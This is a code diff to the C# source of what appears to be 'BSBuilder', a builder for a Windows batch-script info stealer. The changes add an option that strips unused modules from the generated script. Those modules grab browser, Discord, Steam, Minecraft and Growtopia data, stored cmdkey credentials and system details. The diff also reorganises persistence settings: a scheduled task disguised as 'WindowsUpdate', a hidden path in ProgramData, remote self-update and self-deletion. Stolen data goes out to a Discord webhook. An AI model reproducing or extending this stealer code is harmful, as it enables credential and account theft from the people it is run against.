@@ -197,6 +197,16 @@ namespace BSBuilder
             batch = batch.Replace(data, string.Empty);
         }
 
+        void removeFUNCTION(string data)
+        {
+            string first = data;
+            data = data.Substring(5);
+            data = ":" + data.PadLeft(data.Length, '0');
+            string last = data;
+
+            batch = Regex.Replace(batch, first + "\n((.+\n)+)" + last, string.Empty);
+        }
+
         void editVAR(string original, string variable, string data)
         {
             batch = batch.Replace(original, "set \"" + variable + "=" + data + "\"");
@@ -221,60 +231,93 @@ namespace BSBuilder
                 {
                     if (acceptTOS)
                         removeGOTO("goto remove_this_if_you_agree_to_follow_the_TOS");
+                    else if (optimize)
+                        removeFUNCTION("goto remove_this_if_you_agree_to_follow_the_TOS");
+
                     if (startadmin)
                         removeGOTO("goto skipadministrator");
+                    else if (optimize)
+                        removeFUNCTION("goto skipadministrator");
+
                     if (systeminfo)
                         removeGOTO("goto skipsysteminfocapture");
+                    else if (optimize)
+                        removeFUNCTION("goto skipsysteminfocapture");
+
                     if (tasklist)
                         removeGOTO("goto skiptasklist");
+                    else if (optimize)
+                        removeFUNCTION("goto skiptasklist");
+
                     if (netuser)
                         removeGOTO("goto skipnetuser");
+                    else if (optimize)
+                        removeFUNCTION("goto skipnetuser");
+
                     if (quser)
                         removeGOTO("goto skipquser");
+                    else if (optimize)
+                        removeFUNCTION("goto skipquser");
+
                     if (cmdkey)
                         removeGOTO("goto skipcmdkey");
+                    else if (optimize)
+                        removeFUNCTION("goto skipcmdkey");
+
                     if (ipconfig)
                         removeGOTO("goto skipipconfig");
+                    else if (optimize)
+                        removeFUNCTION("goto skipipconfig");
+
                     if (chrome)
                         removeGOTO("goto skipchrome");
+                    else if (optimize)
+                        removeFUNCTION("goto skipchrome");
+
                     if (opera)
                         removeGOTO("goto skipopera");
+                    else if (optimize)
+                        removeFUNCTION("goto skipopera");
+
                     if (vivaldi)
                         removeGOTO("goto skipvivaldi");
+                    else if (optimize)
+                        removeFUNCTION("goto skipvivaldi");
+
                     if (firefox)
                         removeGOTO("goto skipfirefox");
+                    else if (optimize)
+                        removeFUNCTION("goto skipfirefox");
+
                     if (osu)
                         removeGOTO("goto skiposu");
+                    else if (optimize)
+                        removeFUNCTION("goto skiposu");
+
                     if (discord)
                         removeGOTO("goto skipdiscord");
+                    else if (optimize)
+                        removeFUNCTION("goto skipdiscord");
+
                     if (steam)
                         removeGOTO("goto skipsteam");
+                    else if (optimize)
+                        removeFUNCTION("goto skipsteam");
+
                     if (minecraft)
                         removeGOTO("goto skipminecraft");
+                    else if (optimize)
+                        removeFUNCTION("goto skipminecraft");
+
                     if (growtopia)
                         removeGOTO("goto skipgrowtopia");
-                    if (recurring)
-                        removeGOTO("goto skiprecurring");
+                    else if (optimize)
+                        removeFUNCTION("goto skipgrowtopia");
+
                     if (selfdelete)
                         removeGOTO("goto skipselfdelete");
-                    if (webhook.Length != 0)
-                        editVAR("set \"webhook=https://discord.com/api/webhooks/\"", "webhook", webhook);
-                    if (hidepath.Length != 0)
-                        editVAR("set \"vpath=C:\\ProgramData\"", "vpath", hidepath);
-                    if (whenscheduled.Length != 0)
-                        editVAR("set \"when=Daily\"", "when", whenscheduled);
-                    if (schedulename.Length != 0)
-                        editVAR("set \"ScheduleName=WindowsUpdate\"", "ScheduleName", schedulename);
-                    if (batchcopyname.Length != 0)
-                        editVAR("set \"bname=0.bat\"", "bname", batchcopyname);
-                    if (batchupdatername.Length != 0)
-                        editVAR("set \"uname=1.bat\"", "uname", batchupdatername);
-                    if (vbname.Length != 0)
-                        editVAR("set \"vname=0.vbs\"", "vname", vbname);
-                    if (updateurl.Length != 0)
-                        editVAR("set \"updateurl=\"", "updateurl", updateurl);
-                    if (targetusername.Length != 0)
-                        editVAR("set \"targetusername=\"", "targetusername", targetusername);
+                    else if (optimize)
+                        removeFUNCTION("goto skipselfdelete");
 
                     if (reportstartmsg.Length != 0)
                         editCURL(curlmessage0 + "```[Report from %USERNAME% - %NetworkIP%]\\nLocal time: %HH24%:%MI%```" + curlmessage1, reportstartmsg);
@@ -286,6 +329,32 @@ namespace BSBuilder
                         batch = Regex.Replace(batch, @"^::.*", string.Empty, RegexOptions.Multiline);
                         batch = Regex.Replace(batch, @"^\s*$\n|\r", string.Empty, RegexOptions.Multiline);
                     }
+
+                    if (recurring)
+                    {
+                        removeGOTO("goto skiprecurring");
+
+                        if (webhook.Length != 0)
+                            editVAR("set \"webhook=https://discord.com/api/webhooks/\"", "webhook", webhook);
+                        if (hidepath.Length != 0)
+                            editVAR("set \"vpath=C:\\ProgramData\"", "vpath", hidepath);
+                        if (whenscheduled.Length != 0)
+                            editVAR("set \"when=Daily\"", "when", whenscheduled);
+                        if (schedulename.Length != 0)
+                            editVAR("set \"ScheduleName=WindowsUpdate\"", "ScheduleName", schedulename);
+                        if (batchcopyname.Length != 0)
+                            editVAR("set \"bname=0.bat\"", "bname", batchcopyname);
+                        if (batchupdatername.Length != 0)
+                            editVAR("set \"uname=1.bat\"", "uname", batchupdatername);
+                        if (vbname.Length != 0)
+                            editVAR("set \"vname=0.vbs\"", "vname", vbname);
+                        if (updateurl.Length != 0)
+                            editVAR("set \"updateurl=\"", "updateurl", updateurl);
+                        if (targetusername.Length != 0)
+                            editVAR("set \"targetusername=\"", "targetusername", targetusername);
+                    }
+                    else if (optimize)
+                        removeFUNCTION("goto skiprecurring");
 
                     if (obfuscate)
                     {
